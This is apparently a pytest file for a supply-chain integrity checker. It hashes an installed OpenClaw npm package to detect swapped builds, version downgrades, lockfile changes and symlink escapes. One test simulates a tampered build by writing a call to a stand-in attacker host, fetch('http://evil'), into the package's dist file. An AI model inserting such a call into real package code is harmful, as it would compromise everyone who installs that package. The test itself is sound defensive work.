"""F-174 (A) — the installed OpenClaw package as a watched subject.

B33 ("known-vulnerable OpenClaw version gate", HIGH) and C4 read
`meta.lastTouchedVersion` out of `openclaw.json` — a string the agent writes about itself.
A swapped `npm install` of openclaw is the top of the supply chain and nothing compared it
against the artifact on disk.

**Hermetic by construction.** Every test here builds a fake package tree in `tmp_path` and
injects a resolver, so none of them touch the real PATH or the real install (`deptree.
find_package_root` carries the `which=` contract for exactly this). The figures quoted in
the comments below were measured against the real `openclaw@2026.7.1-2` and are recorded
rather than asserted — a test that depended on a globally installed npm package would pass
on the maintainer's box and fail everywhere else.

Measured on that install: 7,717 files, 77.8 MB, `describe_install` **0.34 s** after the
`os.walk` rewrite (0.89 s before it, of which only ~0.3 s was reading bytes; the rest was
`Path` object churn). Against a `--monitor` run of roughly 7.8 s that is affordable, which
is the whole reason a content digest is possible here at all.

Offline, read-only outside tmp_path, stdlib only.
"""
from __future__ import annotations

import json
import os
from pathlib import Path

from clawseccheck.openclawdist import (
    InstallInfo,
    describe_install,
    self_reported_version,
)


def _install(tmp_path: Path, *, name: str = "openclaw", version: str = "2026.7.1-2",
             dist: "dict | None" = None, lock: "str | None" = "npm-shrinkwrap.json",
             entry: bool = True) -> Path:
    """A minimal but REAL npm layout: a bin script on the fake PATH, a package.json that
    names itself, and a dist tree."""
    root = tmp_path / "node_modules" / name
    (root / "bin").mkdir(parents=True, exist_ok=True)
    (root / "package.json").write_text(
        json.dumps({"name": name, "version": version, "bin": {name: "bin/cli.js"}}),
        encoding="utf-8")
    (root / "bin" / "cli.js").write_text("#!/usr/bin/env node\n", encoding="utf-8")
    if entry:
        (root / f"{name}.mjs").write_text("import './dist/main.js';\n", encoding="utf-8")
    for rel, body in (dist if dist is not None else {"main.js": "console.log(1)\n"}).items():
        p = root / "dist" / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(body, encoding="utf-8")
    if lock:
        (root / lock).write_text(json.dumps({"lockfileVersion": 3, "packages": {}}),
                                 encoding="utf-8")
    return root


def _which(root: Path):
    return lambda name: str(root / "bin" / "cli.js")


# ---------------------------------------------------------------- identity

def test_it_reports_the_version_of_the_artifact_on_disk(tmp_path):
    root = _install(tmp_path, version="2026.7.1-2")
    info = describe_install("openclaw", which=_which(root))
    assert info is not None
    assert info.version == "2026.7.1-2"
    assert info.root_name == "openclaw"


def test_an_absent_install_is_none_and_not_an_empty_record(tmp_path):
    """"Not installed via a package manager we can see" and "installed, and it looks like
    this" are different facts. An empty record for the first would make every field read as
    having disappeared the day the install became visible."""
    assert describe_install("openclaw", which=lambda name: None) is None


def test_a_binary_that_resolves_into_a_package_of_another_name_is_refused(tmp_path):
    """`find_package_root`'s soundness gate, restated here because this module is what
    would report on the wrong tree if it ever went away."""
    root = _install(tmp_path, name="something-else")
    assert describe_install("openclaw", which=_which(root)) is None


def test_no_absolute_path_is_carried_into_the_snapshot_shape(tmp_path):
    """An install path is machine-specific detail that would land in the drift baseline
    and, through it, in the event journal and any report a user pastes into an issue."""
    root = _install(tmp_path)
    dim = describe_install("openclaw", which=_which(root)).as_dimension()
    blob = json.dumps(dim)
    assert str(tmp_path) not in blob
    assert "/" not in dim["name"]


# ---------------------------------------------------------------- the digests

def test_a_swapped_build_moves_the_code_digest_with_package_json_untouched(tmp_path):
    """THE attack this dimension exists for. A version bump is visible without any digest;
    a rebuilt `dist/` under an unchanged manifest is not."""
    root = _install(tmp_path, dist={"main.js": "console.log(1)\n"})
    before = describe_install("openclaw", which=_which(root))
    (root / "dist" / "main.js").write_text("fetch('http://evil')\n", encoding="utf-8")
    after = describe_install("openclaw", which=_which(root))
    assert after.code_sha256 != before.code_sha256
    assert after.manifest_sha256 == before.manifest_sha256
    assert after.version == before.version


def test_a_rename_inside_dist_moves_the_digest(tmp_path):
    """Why the relative path is folded in alongside the bytes: what runs changed, even
    though every byte of content is still present somewhere in the tree."""
    root = _install(tmp_path, dist={"a.js": "x\n", "b.js": "y\n"})
    before = describe_install("openclaw", which=_which(root)).code_sha256
    (root / "dist" / "a.js").rename(root / "dist" / "c.js")
    assert describe_install("openclaw", which=_which(root)).code_sha256 != before


def test_the_file_list_is_sorted_and_that_is_load_bearing(tmp_path):
    """A SURVIVING MUTANT. Making `_code_files` return an unsorted list broke nothing in
    this suite, and an independent pass measured the consequence on the real install: the
    unsorted walk diverges at index 0 (`dist/channel-env-vars-D7iKkQG8.js` vs
    `dist/APEv2Parser-Bg0yoiat.js`, 7,717 files), which is a different `code_sha256` for a
    byte-identical install — feeding a HIGH "your program files changed".

    Filesystems make no ordering promise, so `test_the_digest_is_stable_across_calls` below
    can hold on one machine and fail on another. This asserts the property directly."""
    from clawseccheck.openclawdist import _code_files
    root = _install(tmp_path, dist={f"{c}{i}.js": "x\n"
                                    for i, c in enumerate("zqambyc")})
    rels = _code_files(root)
    assert rels == sorted(rels), rels
    assert len(rels) > 3, "precondition: enough entries for an order to exist"


def test_the_digest_is_stable_across_calls(tmp_path):
    """An unstable digest would report drift on every scheduled run — the same false-drift
    shape F-173's baseline reference had to have removed from it."""
    root = _install(tmp_path, dist={f"m{i}.js": f"// {i}\n" for i in range(40)})
    values = {describe_install("openclaw", which=_which(root)).code_sha256
              for _ in range(3)}
    assert len(values) == 1


def test_a_dependency_set_change_moves_the_lock_digest_alone(tmp_path):
    root = _install(tmp_path)
    before = describe_install("openclaw", which=_which(root))
    (root / "npm-shrinkwrap.json").write_text(
        json.dumps({"lockfileVersion": 3, "packages": {"node_modules/x": {}}}),
        encoding="utf-8")
    after = describe_install("openclaw", which=_which(root))
    assert after.lock_sha256 != before.lock_sha256
    assert after.code_sha256 == before.code_sha256


def test_package_lock_is_accepted_when_there_is_no_shrinkwrap(tmp_path):
    root = _install(tmp_path, lock="package-lock.json")
    info = describe_install("openclaw", which=_which(root))
    assert info.lock_name == "package-lock.json" and info.lock_sha256


def test_a_missing_lock_file_is_disclosed_rather_than_hashed_as_empty(tmp_path):
    root = _install(tmp_path, lock=None)
    info = describe_install("openclaw", which=_which(root))
    assert info.lock_sha256 == "" and info.lock_name == ""
    assert any("lock file" in n for n in info.notes)


# ---------------------------------------------------------------- bounds and safety

def test_a_tree_past_the_file_cap_says_so_instead_of_digesting_part_of_it(tmp_path):
    """A partial digest presented as a whole one is a clean verdict about an unexamined
    surface. The bound is disclosed so the consumer can note it."""
    root = _install(tmp_path, dist={f"m{i}.js": f"// {i}\n" for i in range(30)})
    info = describe_install("openclaw", which=_which(root), max_files=10)
    assert info.code_capped is True
    assert info.code_files == 10
    assert any("larger than this run inspects" in n for n in info.notes)


def test_the_byte_cap_also_trips_the_disclosure(tmp_path):
    root = _install(tmp_path, dist={f"m{i}.js": "x" * 5000 for i in range(10)})
    info = describe_install("openclaw", which=_which(root), max_bytes=1000)
    assert info.code_capped is True


def test_an_uncapped_tree_does_not_claim_to_be_capped(tmp_path):
    """Without this the cap test above passes for an implementation that always caps."""
    root = _install(tmp_path)
    assert describe_install("openclaw", which=_which(root)).code_capped is False


def test_a_symlinked_file_inside_dist_is_not_followed(tmp_path):
    """A link planted in `dist/` could otherwise pull an arbitrary file into the digest, or
    walk the scan outside the package root entirely."""
    root = _install(tmp_path, dist={"main.js": "x\n"})
    secret = tmp_path / "outside.txt"
    secret.write_text("not ours\n", encoding="utf-8")
    before = describe_install("openclaw", which=_which(root)).code_sha256
    (root / "dist" / "linked.js").symlink_to(secret)
    after = describe_install("openclaw", which=_which(root))
    assert after.code_sha256 == before, "the symlink must not enter the digest"
    assert after.code_files == describe_install(
        "openclaw", which=_which(root)).code_files


def test_a_symlinked_directory_inside_dist_is_not_descended(tmp_path):
    root = _install(tmp_path, dist={"main.js": "x\n"})
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    (elsewhere / "planted.js").write_text("planted\n", encoding="utf-8")
    before = describe_install("openclaw", which=_which(root)).code_sha256
    (root / "dist" / "sub").symlink_to(elsewhere, target_is_directory=True)
    assert describe_install("openclaw", which=_which(root)).code_sha256 == before


def test_an_unreadable_file_does_not_void_the_whole_digest(tmp_path):
    """One bad file must degrade to "this path was here and could not be read", not to no
    digest at all — and it must not read as identical to that file being absent."""
    root = _install(tmp_path, dist={"a.js": "x\n", "b.js": "y\n"})
    with_both = describe_install("openclaw", which=_which(root)).code_sha256
    os.chmod(root / "dist" / "b.js", 0o000)
    try:
        unreadable = describe_install("openclaw", which=_which(root))
    finally:
        os.chmod(root / "dist" / "b.js", 0o600)
    (root / "dist" / "b.js").unlink()
    absent = describe_install("openclaw", which=_which(root)).code_sha256
    assert unreadable.code_sha256 not in ("", with_both, absent)


def test_node_modules_under_the_package_root_is_not_walked(tmp_path):
    """It is `deptree.py`'s subject, it dwarfs the budget, and B349 already covers its
    install-time execution surface."""
    root = _install(tmp_path)
    before = describe_install("openclaw", which=_which(root)).code_sha256
    nested = root / "node_modules" / "left-pad" / "dist"
    nested.mkdir(parents=True)
    (nested / "index.js").write_text("module.exports = 1\n", encoding="utf-8")
    assert describe_install("openclaw", which=_which(root)).code_sha256 == before


# ---------------------------------------------------------------- the self-report

def test_the_self_reported_version_is_read_from_the_config(tmp_path):
    """Grounded against the real config, where it reads `2026.7.1-2` beside a
    `lastTouchedAt` timestamp."""
    assert self_reported_version(
        {"meta": {"lastTouchedVersion": "2026.7.1-2"}}) == "2026.7.1-2"


def test_a_config_with_no_meta_block_yields_no_claim_rather_than_a_guess(tmp_path):
    for cfg in ({}, None, {"meta": None}, {"meta": {}}, {"meta": {"lastTouchedVersion": 3}}):
        assert self_reported_version(cfg) == ""


def test_the_two_versions_are_separate_fields_and_can_disagree(tmp_path):
    """A downgrade leaves the config stamped with the newer version, so neither source
    alone can show it. On the real machine they agree — which is the expected state, and
    exactly why the disagreement is the signal."""
    root = _install(tmp_path, version="2026.6.0")
    installed = describe_install("openclaw", which=_which(root)).version
    claimed = self_reported_version({"meta": {"lastTouchedVersion": "2026.7.1-2"}})
    assert installed == "2026.6.0" and claimed == "2026.7.1-2"


def test_the_dimension_shape_survives_a_json_round_trip(tmp_path):
    """It goes into the drift baseline, so anything that is not a str/int/bool would come
    back a different type and compare unequal against itself."""
    root = _install(tmp_path)
    dim = describe_install("openclaw", which=_which(root)).as_dimension()
    assert json.loads(json.dumps(dim)) == dim
    assert all(isinstance(v, (str, int, bool)) for v in dim.values())


def test_an_empty_install_info_renders_a_dimension_without_crashing():
    assert InstallInfo().as_dimension()["version"] == ""
